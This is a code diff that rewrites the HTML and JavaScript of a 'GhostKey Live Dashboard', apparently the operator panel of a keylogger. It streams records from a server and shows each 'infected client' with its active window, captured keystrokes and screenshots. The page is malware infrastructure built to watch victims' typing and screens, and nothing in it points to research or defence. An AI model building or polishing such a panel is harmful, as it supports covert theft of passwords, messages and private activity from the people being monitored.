@@ -1,13 +1,78 @@
-<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><title>GhostKey Dashboard</title><style>:root{--bg:#040506;--text:#e5e5e5;--text-muted:#7f8c8d;--border:#151822;--accent:#26ff80}body{background:#040506;color:var(--text);font-family:Consolas,monospace;margin:0;padding:20px}.dot{width:14px;height:14px;background:#26ff80;border-radius:50%;display:inline-block}table{width:100%;border-collapse:collapse;margin-top:20px}th,td{border-bottom:1px solid #333;padding:10px;text-align:left}th{background:#111;color:#888;font-weight:normal}.screenshot{width:150px;height:84px;object-fit:cover;cursor:pointer;border:1px solid #333;border-radius:6px}.modal{display:none;position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.95);justify-content:center;align-items:center;z-index:999}<.modal img{max-width:95%;max-height:95vh;border-radius:8px}</style></head><body>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<title>GhostKey Live Dashboard</title>
+<style>
+  :root{--bg:#040506;--text:#e5e5e5;--accent:#26ff80;--border:#1a1f2e}
+  body{background:var(--bg);color:var(--text);font-family:Consolas,monospace;margin:0;padding:20px}
+  .dot{width:14px;height:14px;background:var(--accent);border-radius:50%;display:inline-block;animation:pulse 2s infinite}
+  @keyframes pulse{0%,100%{opacity:1}50%{opacity:0.5}}
+  h1{font-size:1.8em;margin-bottom:20px}
+  table{width:100%;border-collapse:collapse;margin-top:20px}
+  th{background:#111;color:#888;padding:12px;text-align:left;border-bottom:2px solid var(--border)}
+  td{padding:10px;border-bottom:1px solid #222}
+  .screenshot{width:160px;height:90px;object-fit:cover;cursor:pointer;border:2px solid #333;border-radius:8px;transition:0.2s}
+  .screenshot:hover{border-color:var(--accent);transform:scale(1.05)}
+  .modal{display:none;position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.98);justify-content:center;align-items:center;z-index:999}
+  .modal img{max-width:95%;max-height:95vh;border-radius:12px;box-shadow:0 0 40px rgba(38,255,128,0.5)}
+  .status{color:#555;text-align:center;padding:40px 0;font-size:1.1em}
+</style>
+</head>
+<body>
 <h1><span class="dot"></span> GhostKey Live Dashboard</h1>
-<table><thead><tr><th>#</th><th>Time</th><th>Client</th><th>Window</th><th>Keys</th><th>Screenshot</th></tr></thead><tbody id="logs"><tr><td colspan="6">Waiting for logs...</td></tr></tbody></table>
-<div id="modal" class="modal" onclick="this.style.display='none'"><img id="full"></div>
+<div class="status">Connecting to server...</div>
+
+<table style="display:none">
+  <thead><tr>
+    <th>#</th><th>Time</th><th>Client</th><th>Window</th><th>Keys</th><th>Screenshot</th>
+  </tr></thead>
+  <tbody id="logs"></tbody>
+</table>
+
+<div id="modal" class="modal" onclick="this.style.display='none'">
+  <img id="full" src="">
+</div>
+
 <script>
-let id=1;const tbody=document.getElementById("logs");
-const es=new EventSource("/events");
-es.onmessage=e=>{try{const d=JSON.parse(e.data);
-const row=document.createElement("tr");
-row.innerHTML=`<td>${id++}</td><td>${d.ts||new Date().toISOString().slice(0,19).replace("T"," ")}</td><td>${d.client}</td><td>${d.win||"Browser"}</td><td>${(d.keys||[]).join("")}</td><td>${d.Screenshot?`<img class="screenshot" src="${d.Screenshot}" onclick="document.getElementById('full').src=this.src;document.getElementById('modal').style.display='flex'">`:"—"}</td>`;
-tbody.insertBefore(row,tbody.firstChild);
-}catch{}}
-</script></body></html>
+let counter = 1;
+const tbody = document.getElementById("logs");
+const table = tbody.parentElement.parentElement;
+const status = document.querySelector(".status");
+
+const es = new EventSource("/events");
+
+es.onopen = () => {
+  status.textContent = "Connected — Waiting for infected clients...";
+  table.style.display = "table";
+};
+
+es.onmessage = (e) => {
+  try {
+    const d = JSON.parse(e.data);
+    const row = document.createElement("tr");
+    const ts = new Date().toISOString().slice(0,19).replace("T"," ");
+
+    row.innerHTML = `
+      <td>${counter++}</td>
+      <td>${ts}</td>
+      <td><strong>${d.Client || "??"}</strong></td>
+      <td>${d.Window || "Desktop"}</td>
+      <td>${(d.Keys || []).join("").substring(0,120)}${(d.Keys || []).length > 120 ? "..." : ""}</td>
+      <td>${d.Screenshot ? 
+        `<img class="screenshot" src="${d.Screenshot}" onclick="document.getElementById('full').src=this.src;document.getElementById('modal').style.display='flex'">` 
+        : "—"}</td>
+    `;
+    tbody.insertBefore(row, tbody.firstChild);
+  } catch(err) {
+    console.log("Parse error:", err);
+  }
+};
+
+es.onerror = () => {
+  status.textContent = "Connection lost — reconnecting...";
+  status.style.color = "#e74c3c";
+};
+</script>
+</body>
+</html>
